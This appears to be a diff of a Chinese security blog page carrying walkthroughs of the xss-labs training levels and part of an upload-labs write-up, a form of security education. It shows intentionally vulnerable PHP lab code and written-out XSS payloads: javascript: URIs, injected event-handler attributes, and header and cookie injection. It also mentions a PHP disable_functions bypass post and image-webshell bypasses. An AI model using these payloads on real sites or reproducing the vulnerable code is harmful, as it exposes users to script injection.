class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以我们构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(&#39;http:&#x2F;&#x2F;&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(&#x2F;xss&#x2F;)&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="Pass10【相同属性的覆盖】"><a href="#Pass10【相同属性的覆盖】" class="headerlink" title="Pass10【相同属性的覆盖】"></a>Pass10【相同属性的覆盖】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们构造关于t_sort的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot; onmouseover&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot; type&#x3D;&quot;text</span><br></pre></td></tr></table></figure>
+
+<p>最后相当于【因为事件触发需要显示出这个text框，所以要把type属性改一下】</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;ag&quot; onmouseover&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot; type&#x3D;&quot;text&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="Pass11【HTTP请求头1】"><a href="#Pass11【HTTP请求头1】" class="headerlink" title="Pass11【HTTP请求头1】"></a>Pass11【HTTP请求头1】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/02/08/xss-labs/11-1.png" alt="11-1"></p>
+<p>利用referer请求头传上一关的payload即可</p>
+<h1 id="Pass12【HTTP请求头2】"><a href="#Pass12【HTTP请求头2】" class="headerlink" title="Pass12【HTTP请求头2】"></a>Pass12【HTTP请求头2】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>差不多，就是换了个请求头</p>
+<p><img src="/2021/02/08/xss-labs/12-1.png" alt="12-1"></p>
+<h1 id="Pass13【cookie传参】"><a href="#Pass13【cookie传参】" class="headerlink" title="Pass13【cookie传参】"></a>Pass13【cookie传参】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload还是Pass10的，改一下cookie即可</p>
+<p><img src="/2021/02/08/xss-labs/13-1.png" alt="13-1"></p>
+<h1 id="Pass14【exif】"><a href="#Pass14【exif】" class="headerlink" title="Pass14【exif】"></a>Pass14【exif】</h1><p>链接失效了，找机会自己复现一下</p>
+<h1 id="Pass15【ng-include包含漏洞】"><a href="#Pass15【ng-include包含漏洞】" class="headerlink" title="Pass15【ng-include包含漏洞】"></a>Pass15【ng-include包含漏洞】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>ng-include可以包含一个文件或是html页面，<strong>意思就是我们可以利用src包含一个存在xss的页面。</strong></p>
+<p>但是要记住格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class&#x3D;&quot;ng-include:&#39;a.php&#39;&quot;</span><br><span class="line">class&#x3D;&#39;ng-include:&quot;a.php&quot;&#39;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>1.ng-include,如果单纯指定地址，必须要加引号</strong></p>
+<p><strong>2.ng-include,加载外部html，script标签中的内容不执行</strong></p>
+<p><strong>3.ng-include,加载外部html中含有style标签样式可以识别</strong></p>
+</blockquote>
+<p>选一个Pass构造，但是因为被单引号包裹，所以该Pass的构造里不能含有单引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src&#x3D;&#39;level4.php?keyword&#x3D;ag&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&#39;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里虽然有htmlspecialchars，但是并不影响。</p>
+<p>本人见解：在Pass15这个页面上，虽然我们看到对于Pass4页面的GET参数已经被实体化</p>
+<p><img src="/2021/02/08/xss-labs/15-1.png" alt="15-1"></p>
+<p>但是这个请求会被发送到后端，这时这些实体就又变成以前的字符。而后端处理完请求，就把页面返回了，这个页面是一个整体，GET参数已经被实现了。</p>
+</blockquote>
+<h2 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h2><blockquote>
+<p>这里虽然有htmlspecialchars，但是并不影响。</p>
+</blockquote>
+<p>这里引申出了htmlspecialchars的编码的有效域</p>
+<p>还有ng-include包含文件的运作机制</p>
+<h1 id="Pass16【img标签-0a换行】"><a href="#Pass16【img标签-0a换行】" class="headerlink" title="Pass16【img标签+%0a换行】"></a>Pass16【img标签+%0a换行】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"	"</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用img标签，但发现还过滤了空格，所以用%0a【换行】。</p>
+<blockquote>
+<p>在HTML中可以将%0a或者%0D当成空格使用。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="Pass17【参数】"><a href="#Pass17【参数】" class="headerlink" title="Pass17【参数】"></a>Pass17【参数】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以给embed标签加属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D; onmouseover&amp;arg02&#x3D;alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>
+
+<p>即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src&#x3D;xsf01.swf? onmouseover&#x3D;alert(&#x2F;xss&#x2F;) width&#x3D;100% heigth&#x3D;100%&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="Pass18【参数2】"><a href="#Pass18【参数2】" class="headerlink" title="Pass18【参数2】"></a>Pass18【参数2】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这不和Pass17一样吗。。。可能是swf文件有差别，但是目前还有些懵。</p>
+<h1 id="Pass19【Flash-XSS】"><a href="#Pass19【Flash-XSS】" class="headerlink" title="Pass19【Flash XSS】"></a>Pass19【Flash XSS】</h1><p><a href="https://blog.csdn.net/u014029795/article/details/103213877" target="_blank" rel="noopener">大佬文章</a></p>
+<h1 id="Pass20【Flash-XSS（偏代码审计）】"><a href="#Pass20【Flash-XSS（偏代码审计）】" class="headerlink" title="Pass20【Flash XSS（偏代码审计）】"></a>Pass20【Flash XSS（偏代码审计）】</h1><p><a href="https://blog.csdn.net/u014029795/article/details/103217680" target="_blank" rel="noopener">大佬文章</a></p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/02/06/%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99/">有用的工具网站</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-02-06</time><div class="content"><ol>
+<li><a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">unicode字符合集</a></li>
+</ol>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/31/exp%E6%94%B6%E9%9B%86/">exp收集</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-31</time><div class="content"><h2 id="PHP-7-0-7-3-disable-functions-bypass"><a href="#PHP-7-0-7-3-disable-functions-bypass" class="headerlink" title="PHP 7.0-7.3 disable_functions bypass"></a>PHP 7.0-7.3 disable_functions bypass</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><ul>
 <li>7.0 - all versions to date</li>
 <li>7.1 - all versions to date</li>
 <li>7.2 - all versions to date</li>
@@ -261,7 +536,145 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89504E470D0A1A0A</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/01/29/upload-labs/14-4.png" alt="14-4"></p>
-<h1 id="一些有关知识"><a href="#一些有关知识" class="headerlink" title="一些有关知识"></a>一些有关知识</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><a href="https://www.cnblogs.com/haimian/p/6066839.html" target="_blank" rel="noopener">$FILE</a></p>
+<h1 id="Pass17【二次渲染】"><a href="#Pass17【二次渲染】" class="headerlink" title="Pass17【二次渲染】"></a>Pass17【二次渲染】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filetype &#x3D; $_FILES[&#39;upload_file&#39;][&#39;type&#39;];		&#x2F;&#x2F;MIME类型，其实也就是后缀</span><br></pre></td></tr></table></figure>
+
+<p>如果单纯是要过这一关，那么直接将base.php后缀改成了base.jpg就可以了，虽然显示上传失败，但后台其实已经成功了。</p>
+<p>但如果想真正绕过二次渲染，得有专门的图片马。</p>
+<h2 id="小发现3"><a href="#小发现3" class="headerlink" title="小发现3"></a>小发现3</h2><p>制作绕过二次渲染的图片马</p>
+<h1 id="Pass18【条件竞争】"><a href="#Pass18【条件竞争】" class="headerlink" title="Pass18【条件竞争】"></a>Pass18【条件竞争】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span 